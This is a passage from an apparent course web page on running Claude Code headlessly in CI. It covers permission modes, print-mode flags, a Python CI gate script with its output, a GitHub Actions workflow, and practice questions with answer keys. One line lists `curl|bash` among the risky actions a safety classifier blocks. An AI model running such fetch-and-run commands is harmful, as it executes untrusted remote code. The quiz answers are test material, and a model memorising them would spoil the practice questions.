a separate classifier blocks risky ones (force pushes, `curl</td><td>bash`, production deploys, anything beyond your request)</td><td>Long tasks without constant prompts</td></tr><tr><td><code>dontAsk</code></td><td>Only what allow rules permit; everything else is denied, not asked</td><td>Locked-down scripts</td></tr><tr><td><code>bypassPermissions</code></td><td>Everything</td><td>Only inside an isolated container or VM</td></tr></tbody></table></div><aside class="call warn"><b>Watch out</b><p>Anthropic's docs are explicit that auto mode <strong>does not guarantee safety</strong>: it's a classifier making judgement calls. For unattended runs, combine a narrow <code>--allowedTools</code> list, deny rules, hooks and an isolated environment. In the terminal, Shift+Tab cycles through the interactive modes.</p></aside><h3>Print mode, step by step</h3><div class="cell file"><div class="code"><div class="lab"><span>Headless examples</span><button class="copy" type="button">Copy</button></div><pre><code class="language-bash"># One question, plain text out
+claude -p &quot;Summarise what changed in the last 5 commits&quot;
+
+# Pipe input in
+cat build-error.log | claude -p &quot;Explain this build failure and the most likely fix&quot;
+
+# Machine-readable result, limited tools and turns
+claude -p &quot;Find unused functions in app/&quot; \
+  --output-format json \
+  --allowedTools &quot;Read&quot; &quot;Grep&quot; &quot;Glob&quot; \
+  --max-turns 15
+
+# Output that must match a schema (lands in .structured_output)
+claude -p &quot;Review the diff in pr.diff&quot; --output-format json --json-schema &quot;$(cat findings.schema.json)&quot;
+
+# Continue a session non-interactively, adding to the system prompt
+claude -p --resume &quot;$SESSION_ID&quot; &quot;Now add tests&quot; --append-system-prompt &quot;Use pytest fixtures from conftest.py&quot;
+
+# Event-by-event output for a live log or another program
+claude -p &quot;Run the test suite and fix failures&quot; --output-format stream-json --verbose</code></pre></div></div><aside class="call exam"><b>Exam lens</b><p>A CI job that <strong>hangs</strong> is waiting for input that will never come: the fix is <code>-p</code>. Pipeline output that's <strong>hard to parse</strong> needs <code>--output-format json</code> (plus <code>--json-schema</code> for a fixed shape). A job that must not <strong>run away</strong> needs <code>--max-turns</code>, <code>--max-budget-usd</code> and a narrow <code>--allowedTools</code>.</p></aside><h3>Using the JSON result in a script</h3><p>With <code>--output-format json</code>, Claude Code prints one JSON object when it finishes. The shape below follows the documented result message (fields such as <code>result</code>, <code>session_id</code>, <code>is_error</code>, <code>num_turns</code> and <code>total_cost_usd</code>); it's our example, not a recorded run. The script logic is real.</p><div class="cell"><div class="code"><div class="lab"><span>Python</span><button class="copy" type="button">Copy</button></div><pre><code class="language-python">import json
+
+raw = &quot;&quot;&quot;{&quot;type&quot;: &quot;result&quot;, &quot;subtype&quot;: &quot;success&quot;, &quot;is_error&quot;: false, &quot;num_turns&quot;: 7,
+  &quot;session_id&quot;: &quot;4f1c2a9e-example&quot;, &quot;duration_ms&quot;: 48210, &quot;total_cost_usd&quot;: 0.21,
+  &quot;result&quot;: &quot;Found 3 unused functions.&quot;,
+  &quot;structured_output&quot;: {&quot;findings&quot;: [
+    {&quot;file&quot;: &quot;app/services/billing.py&quot;, &quot;line&quot;: 88, &quot;severity&quot;: &quot;high&quot;,
+     &quot;message&quot;: &quot;Refund amount not validated against the original charge&quot;},
+    {&quot;file&quot;: &quot;app/api/bookings.py&quot;, &quot;line&quot;: 41, &quot;severity&quot;: &quot;medium&quot;,
+     &quot;message&quot;: &quot;No 409 when the slot was taken between check and hold&quot;},
+    {&quot;file&quot;: &quot;app/utils/dates.py&quot;, &quot;line&quot;: 12, &quot;severity&quot;: &quot;low&quot;,
+     &quot;message&quot;: &quot;Unused helper `to_local_time`&quot;}]}}&quot;&quot;&quot;
+
+def ci_gate(raw, fail_on=(&quot;high&quot;,)):
+    r = json.loads(raw)
+    if r[&quot;is_error&quot;] or r[&quot;subtype&quot;] != &quot;success&quot;:
+        print(f&quot;Claude run failed ({r[&#x27;subtype&#x27;]}): treat as a pipeline error, not a pass&quot;)
+        return 2
+    findings = r[&quot;structured_output&quot;][&quot;findings&quot;]
+    for f in findings:                    # each becomes an inline PR comment
+        print(f&quot;comment → {f[&#x27;file&#x27;]}:{f[&#x27;line&#x27;]}  [{f[&#x27;severity&#x27;]}] {f[&#x27;message&#x27;]}&quot;)
+    blocking = [f for f in findings if f[&quot;severity&quot;] in fail_on]
+    print(f&quot;\n{len(findings)} findings, {len(blocking)} blocking · {r[&#x27;num_turns&#x27;]} turns · &quot;
+          f&quot;~${r[&#x27;total_cost_usd&#x27;]:.2f} (client-side estimate) · session {r[&#x27;session_id&#x27;]}&quot;)
+    return 1 if blocking else 0
+
+print(&quot;exit code:&quot;, ci_gate(raw))
+print(&quot;exit code:&quot;, ci_gate(&#x27;{&quot;type&quot;: &quot;result&quot;, &quot;subtype&quot;: &quot;error_max_turns&quot;, &quot;is_error&quot;: true, &quot;num_turns&quot;: 15}&#x27;))</code></pre></div><div class="out"><div class="lab"><span>Output · produced by running this code</span></div><pre>comment → app/services/billing.py:88  [high] Refund amount not validated against the original charge
+comment → app/api/bookings.py:41  [medium] No 409 when the slot was taken between check and hold
+comment → app/utils/dates.py:12  [low] Unused helper `to_local_time`
+
+3 findings, 1 blocking · 7 turns · ~$0.21 (client-side estimate) · session 4f1c2a9e-example
+exit code: 1
+Claude run failed (error_max_turns): treat as a pipeline error, not a pass
+exit code: 2</pre></div></div><aside class="call read"><b>How to read it</b><p>The structured findings become inline comments, and only the high-severity one fails the build. The second run hit <code>--max-turns</code>: the script treats it as an error rather than "no findings", which is the bug that lets broken reviews pass silently.</p></aside><h3>Generator and reviewer: separate sessions</h3><p>A session that just wrote code carries its own reasoning in its context, and tends to agree with it. Run review as a <strong>separate invocation</strong> with a fresh context (and ideally a reviewer prompt or subagent), so it reads the change as a newcomer would.</p><figure class="seq anim" style="--c:3"><figcaption>Code generation and review as separate Claude runs</figcaption><div class="actors"><b>CI pipeline</b><b>Claude run A (writer)</b><b>Claude run B (reviewer)</b></div><div class="lane"><div class="m r" style="grid-column:1/3;--s:2;--k:0"><span>claude -p "Implement issue #214" --permission-mode acceptEdits</span><i></i></div><div class="m l reply" style="grid-column:1/3;--s:2;--k:1"><span>diff + summary (session A)</span><i></i></div><div class="m r" style="grid-column:1/4;--s:3;--k:2"><span>claude -p "Review this diff" --output-format json --json-schema ...</span><i></i></div><div class="m note" style="grid-column:3/4;--k:3"><span>Fresh context: sees the diff, CLAUDE.md and the standards, not A's reasoning</span></div><div class="m l reply" style="grid-column:1/4;--s:3;--k:4"><span>structured findings → PR comments</span><i></i></div></div></figure><aside class="call tip"><b>Tip</b><p>In CI, Claude Code still reads the repo's CLAUDE.md. That's where to put review criteria and testing standards (what makes a valuable test, which fixtures exist), so the CI instance applies the same standards as everyone else.</p></aside><h3>GitHub Actions</h3><p>The official action is <code>anthropics/claude-code-action</code>. The quickest setup is <code>/install-github-app</code> inside Claude Code, which installs the GitHub app, stores the API key as a repository secret and opens a PR with the workflow. This workflow responds when someone mentions <code>@claude</code> in a comment:</p><div class="cell file"><div class="code"><div class="lab"><span>.github/workflows/claude.yml</span><button class="copy" type="button">Copy</button></div><pre><code class="language-yaml">name: Claude Code
+on:
+  issue_comment:
+    types: [created]
+  pull_request_review_comment:
+    types: [created]
+jobs:
+  claude:
+    if: contains(github.event.comment.body, &#x27;@claude&#x27;)
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: write
+      issues: write
+      id-token: write
+    steps:
+      - uses: actions/checkout@v6
+        with:
+          fetch-depth: 1
+      - uses: anthropics/claude-code-action@v1
+        with:
+          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
+          claude_args: &quot;--max-turns 20 --model claude-sonnet-5-5&quot;</code></pre></div></div><div class="tbl"><table><thead><tr><th>Input</th><th>Purpose</th></tr></thead><tbody><tr><td><code>anthropic_api_key</code></td><td>From a repository secret, never written into the YAML</td></tr><tr><td><code>prompt</code></td><td>When set, the action runs that task automatically instead of waiting for <code>@claude</code></td></tr><tr><td><code>claude_args</code></td><td>Any CLI flags: <code>--max-turns</code>, <code>--model</code>, <code>--allowedTools</code>...</td></tr><tr><td><code>use_bedrock</code> / <code>use_vertex</code> / <code>use_foundry</code></td><td>Run through a cloud provider instead of the Claude API</td></tr></tbody></table></div><p>GitLab CI/CD support exists too (in beta, maintained by GitLab): a pipeline job installs Claude Code and runs <code>claude -p</code> with an allowed-tools list.</p><div class="quiz" data-multi="0"><p class="q"><b>Practice question</b>A nightly CI job runs <code>claude "Update the changelog"</code> and never finishes. What's the fix?</p><div class="opts"><button type="button" data-ok="0">A. Add <code>--verbose</code></button><button type="button" data-ok="1">B. Run it in print mode with <code>claude -p</code>, so it completes the task and exits without waiting for input</button><button type="button" data-ok="0">C. Switch to plan mode</button><button type="button" data-ok="0">D. Add more detail to CLAUDE.md</button></div><p class="why" hidden>Without <code>-p</code>, Claude Code starts an interactive session and waits for a person who will never arrive. Print mode processes the prompt, writes the result to stdout and exits.</p></div><div class="quiz" data-multi="1"><p class="q"><b>Practice question</b><span class="n">Select 2</span>A pipeline must post each of Claude's review findings as an inline PR comment. Which flags make that dependable? (Select 2)</p><div class="opts"><button type="button" data-ok="1">A. <code>--output-format json</code></button><button type="button" data-ok="1">B. <code>--json-schema</code> with a schema for the findings</button><button type="button" data-ok="0">C. <code>--permission-mode bypassPermissions</code></button><button type="button" data-ok="0">D. <code>--continue</code></button></div><button type=button class=check>Check answer</button><p class="why" hidden>JSON output makes the result machine-readable, and a schema fixes its shape so the script can rely on fields such as file, line and severity. Bypassing permissions adds risk and does nothing for the output format; <code>--continue</code> reuses a session, which is the opposite of what a review should do.</p></div><div class="quiz" data-multi="0"><p class="q"><b>Practice question</b>Why should the code review in a pipeline run as a separate Claude Code invocation from the one that wrote the code?</p><div class="opts"><button type="button" data-ok="0">A. Each invocation can only use one tool</button><button type="button" data-ok="0">B. The reviewer needs a different API key</button><button type="button" data-ok="1">C. A fresh session doesn't carry the author's reasoning, so it is more likely to question the code</button><button type="button" data-ok="0">D. Claude Code can't review its own diffs</button></div><p class="why" hidden>The writer's session holds the reasoning behind its own decisions and tends to confirm them. A separate session, with only the diff and the standards, reviews the change the way an independent colleague would.</p></div></section>
+  <div class="pager"><a class="btn ghost" href="../module-2/">← Module 2</a><a class="btn" href="../module-4/">Module 4 →</a></div>
+  </div>
+</div>
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="fine" style="border:none;margin:0;padding:0">
+      <span>© 2026 XploreAI · <a href="/">xploreai.co.in</a></span>
+      <span><a href="mailto:hello@xploreai.co.in">hello@xploreai.co.in</a></span>
+    </div>
+  </div>
+</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/json.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/markdown.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/typescript.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/yaml.min.js"></script>
+<script src="/courses/claude-developer/course.js?v=1792997601"></script>
+</body>
+</html>
